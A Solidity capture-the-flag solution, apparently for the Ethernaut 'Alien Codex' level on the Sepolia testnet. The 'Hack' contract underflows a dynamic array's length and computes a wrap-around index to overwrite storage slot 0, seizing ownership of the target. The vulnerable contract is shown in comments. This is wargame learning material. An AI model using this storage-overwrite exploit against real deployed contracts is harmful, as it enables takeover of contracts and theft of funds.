// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


// Get new instance and CA: 0xfF03F56f932e63Bb0418f76DD9169d625C4b27b4
// Deploy Hack contract below with CA from original contract (see above)

interface IAlienCodex {
    function owner() external view returns (address);
    function codex(uint256) external view returns (bytes32);
    function retract() external;
    function makeContact() external;
    function revise(uint256 i, bytes32 _content) external;
}

contract Hack {
    /*
    storage
    slot 0 - owner (20 bytes), contact (1 byte)
    slot 1 - length of the array codex

    // slot where array element is stored = keccak256(slot)) + index
    // h = keccak256(1)
    slot h + 0 - codex[0] 
    slot h + 1 - codex[1] 
    slot h + 2 - codex[2] 
    slot h + 3 - codex[3] 

    Find i such that
    slot h + i = slot 0
    h + i = 0 so i = 0 - h
    */
    constructor(IAlienCodex target) {
        target.makeContact();
        target.retract();

        uint256 h = uint256(keccak256(abi.encode(uint256(1))));
        uint256 i;
        unchecked {
            // h + i = 0 = 2**256
            i -= h;
        }

        target.revise(i, bytes32(uint256(uint160(msg.sender))));
        require(target.owner() == msg.sender, "hack failed");
    }
}

// I cant deploy this old version myself
// Not a problem because we use the already deployed contract at Sepolia
// COMMENT OUT HERE
// import "../helpers/Ownable-05.sol";

// contract AlienCodex is Ownable {

//     // Goal to set owner to msg.sender
//     // Owner not visible here


//     bool public contact;
//     bytes32[] public codex;

//     modifier contacted() {
//         assert(contact);
//         _;
//     }

//     function makeContact() public {
//         contact = true;
//     }

//     function record(bytes32 _content) public contacted {
//         codex.push(_content);
//     }

//     function retract() public contacted {
//         codex.length--; // In older versions: reduce length in this way
//     }

//     // Only accessible with modifier 'contacted'
//     // Set at true in function makeContact()
//     function revise(uint256 i, bytes32 _content) public contacted {
//         codex[i] = _content; // Updates element i in codex 
//     }
// }